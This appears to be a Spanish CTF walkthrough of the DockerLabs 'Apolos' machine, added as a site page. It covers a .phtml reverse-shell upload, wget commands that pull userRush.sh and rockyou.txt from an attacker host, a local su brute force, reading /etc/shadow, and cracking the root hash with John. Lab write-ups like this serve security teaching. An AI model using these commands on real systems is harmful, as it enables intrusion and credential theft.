@@ -1,0 +1,239 @@
+---
+title: Apolos
+description: Resolución completa de la máquina virtual *Apolos* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Apolos**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web que permite el registro de usuarios y contiene un panel administrativo con una funcionalidad de subida de archivos. Aunque la extensión `.php` está bloqueada, se descubre que `.phtml` es aceptada, permitiendo la subida de una reverse shell y obteniendo acceso como `www-data`.
+Una vez dentro, se realiza un ataque de fuerza bruta local contra el usuario `luisillo_o` utilizando `userRush`, obteniendo acceso a esta cuenta. Este usuario pertenece al grupo `shadow`, lo que permite leer `/etc/shadow` y extraer el hash de `root`. Tras crackearlo con John the Ripper, se obtiene acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Apolos',
+    Autor: 'Luisillo_o',
+    Dificultad: 'Media',
+    Fecha: '06/09/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Apolos.zip
+sudo bash auto_deploy.sh Apolos.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Apolos/{content,exploits,nmap,scripts}
+cd Apolos
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763970791/Ports_dojwfy.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Gobuster_bqj2zo.png)
+
+**Rutas encontradas:**
+- `/index.php` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Index_zjxpmz.png)
+- `/login.php` — Portal de acceso.
+- `/register.php` — Registro de usuarios.
+- `/img` — Directorio accesible.
+- `/uploads` — Directorio accesible pero vacío.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Registro de usuario
+
+Se crea un nuevo usuario:
+
+![Register](https://res.cloudinary.com/dewqswzke/image/upload/v1763970792/Register_glofai.png)
+
+### 2.2 Descubrimiento del panel administrativo
+
+Tras autenticarse, se realiza un escaneo adicional que revela:
+
+- `/admin_dashboard.php` — Panel administrativo.
+  ![Admin Panel](https://res.cloudinary.com/dewqswzke/image/upload/v1763970789/AdminPanel_mt1kwe.png)
+
+### 2.3 Subida de reverse shell
+
+El panel contiene un formulario para subir archivos:
+
+![Subir archivo](https://res.cloudinary.com/dewqswzke/image/upload/v1763970795/SubirArchivo_qojrjk.png)
+
+La extensión `.php` está bloqueada, pero `.phtml` es aceptada. Se sube una reverse shell en `.phtml`.
+
+![Uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1763970796/Uploads_w6cegy.png)
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede al archivo malicioso:
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763970793/Reverse_jwoo9x.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → luisillo_o
+
+No se encuentran binarios SUID ni permisos sudo útiles. Se realiza un ataque de fuerza bruta local sobre el usuario `luisillo_o` utilizando `userRush`.
+
+En la máquina atacante se levanta un servidor web:
+
+```bash
+python3 -m http.server 8000
+```
+
+En la máquina víctima se descargan las herramientas:
+
+```bash
+wget http://<IP_attacker>:8000/userRush.sh
+wget http://<IP_attacker>:8000/rockyou.txt
+chmod +x userRush.sh
+```
+
+Se ejecuta:
+
+```bash
+./userRush.sh -u luisillo_o -d rockyou.txt -t 10
+```
+
+![Password](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Password_epy7n0.png)
+
+Se cambia al usuario:
+
+```bash
+su luisillo_o
+```
+
+![Luisillo](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/Luisillo_svqrbk.png)
+
+### 3.2 De luisillo_o → root
+
+El usuario pertenece al grupo **shadow**, permitiendo leer `/etc/shadow`:
+
+```bash
+cat /etc/shadow
+```
+
+Se extrae el hash de `root` y se crackea con John the Ripper:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1763970790/John_tnhoil.png)
+
+Se cambia a root:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763970794/Root_gtipwp.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Validación deficiente en subida de archivos (.phtml permitido)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Panel administrativo accesible sin protección adicional",
+      severity: "Alta",
+      impact: "Exposición de funcionalidades sensibles"
+    },
+    {
+      vulnerability: "Credenciales hardcodeadas en código fuente",
+      severity: "Alta",
+      impact: "Exposición de credenciales del sistema"
+    },
+    {
+      vulnerability: "Usuario perteneciente al grupo shadow sin justificación",
+      severity: "Crítica",
+      impact: "Lectura de hashes de contraseñas del sistema"
+    },
+    {
+      vulnerability: "Ausencia de controles contra fuerza bruta en su",
+      severity: "Media",
+      impact: "Ataques de diccionario ilimitados"
+    }
+  ]}
+/>
